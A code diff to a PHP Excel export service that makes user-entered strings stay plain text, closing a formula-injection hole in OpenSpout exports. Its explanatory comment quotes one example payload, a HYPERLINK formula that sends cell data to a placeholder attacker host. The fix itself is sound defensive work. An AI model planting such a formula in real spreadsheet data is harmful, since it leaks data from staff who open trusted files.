@@ -3,6 +3,7 @@
 namespace App\Services;
 
 use CodeIgniter\HTTP\ResponseInterface;
+use OpenSpout\Common\Entity\Cell;
 use OpenSpout\Common\Entity\Row;
 use OpenSpout\Common\Entity\Style\Style;
 use OpenSpout\Writer\Common\Entity\Sheet;
@@ -190,10 +191,10 @@ class ExcelExportService
             }
         }
 
-        $writer->addRow(Row::fromValuesWithStyle([$summaryLine], new Style()));
+        $writer->addRow($this->literalRow([$summaryLine], [], new Style()));
 
         $headerStyle = (new Style())->withFontBold(true);
-        $writer->addRow(Row::fromValuesWithStyle(array_column($columns, 'header'), $headerStyle));
+        $writer->addRow($this->literalRow(array_column($columns, 'header'), [], $headerStyle));
 
         $columnStyles = [];
         foreach (array_values($columns) as $i => $col) {
@@ -203,12 +204,50 @@ class ExcelExportService
         }
 
         foreach ($rows as $row) {
-            $writer->addRow(
-                $columnStyles === []
-                    ? Row::fromValues($row)
-                    : Row::fromValuesWithStyles($row, $columnStyles)
-            );
+            $writer->addRow($this->literalRow($row, $columnStyles));
         }
+    }
+
+    /**
+     * Builds a row in which every string stays a string.
+     *
+     * Row::fromValues() and its styled siblings all funnel through
+     * Cell::fromValue(), which ends with:
+     *
+     *     if (isset($value[0]) && '=' === $value[0]) {
+     *         return new FormulaCell($value, ...);
+     *     }
+     *
+     * -- so any exported value a user typed starting with '=' is written as a
+     * live <f> element rather than text. A candidate remark of
+     * =HYPERLINK("http://attacker/?x="&A1,"Click") therefore arrives in the
+     * recipient's Excel as an executable formula, and the recipient is staff
+     * opening a file from a system they trust. Every one of the eight exports
+     * and the Excel backup carries user-supplied strings.
+     *
+     * Only string handling changes. Ints, floats, DateTimes, bools, null and
+     * '' still go through Cell::fromValue(), so number formats, date
+     * serialisation and empty cells are byte-for-byte what they were -- the
+     * per-column Style is passed through identically. The single observable
+     * difference is that a value starting with '=' now shows the text the user
+     * actually typed instead of a broken or hostile formula.
+     *
+     * @param array<array-key, mixed> $values
+     * @param array<array-key, Style> $columnStyles keyed as writeSheetContent builds them
+     */
+    private function literalRow(array $values, array $columnStyles, ?Style $uniformStyle = null): Row
+    {
+        $cells = [];
+
+        foreach ($values as $key => $value) {
+            $style = $uniformStyle ?? ($columnStyles[$key] ?? null);
+
+            $cells[] = is_string($value) && $value !== ''
+                ? new Cell\StringCell($value, $style)
+                : Cell::fromValue($value, $style);
+        }
+
+        return new Row(array_values($cells));
     }
 
     /**
